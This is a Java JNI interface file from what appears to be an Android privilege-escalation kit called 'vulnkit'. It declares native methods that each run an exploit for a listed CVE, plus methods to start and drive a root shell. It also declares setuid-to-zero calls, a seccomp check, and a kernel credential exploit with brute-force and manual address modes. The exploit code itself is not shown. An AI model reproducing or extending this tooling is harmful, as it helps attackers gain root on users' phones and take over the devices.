package org.dpdns.sqxy090123.kit.vulnkit;

public class JNIInterface {
    static {
        System.loadLibrary("vulnkit");
    }
    // 检测 setuid 系统调用是否可用（不被 seccomp 杀死）
    public static native int checkSetuidAvailable();
    // 各漏洞独立 native 方法
    public static native int cve20192215();
    public static native int cve20200041();
    public static native int cve20210920();
    public static native boolean cve202538352_exploit();
    public static native boolean cve20260107_exploit();
    public static native boolean cve202621385_exploit();
    public static native boolean cve202443093_setuidZero();
    public static native boolean cve202548572_setuidZero();
    // Root Shell 管理
    public static native int startRootShell();
    public static native int writeRootShell(String cmd);
    public static native String readRootShell();
    public static native void closeRootShell();
    public static native boolean isRootShellAvailable();
    public static native boolean isHarmonyOS();
    public static native boolean cve20254642_exploit();
    public static native boolean cve202320938_exploit();
    public static native boolean cve202222057_exploit();
    public static native boolean cve202520801_exploit();
    public static native boolean cve202443066_exploit();
    public static native boolean cve202548543_exploit();
    public static native boolean cve202521479_exploit();
    public static native boolean cve202536920_exploit();
    public static native boolean cve20260038_exploit();
    public static native boolean cve20260032_exploit();
    public static native boolean cve202453104_exploit();
    // 穷举模式，返回一个包含三个 long 的数组 [commit_creds, prepare_kernel_cred, offset]
    public static native boolean cve20250088_exploit_bruteforce(long[] resultParams);
    // 手动模式，直接使用给定参数
    public static native boolean cve20250088_exploit_with_params(long commit_creds, long prepare_kernel_cred, int offset);
}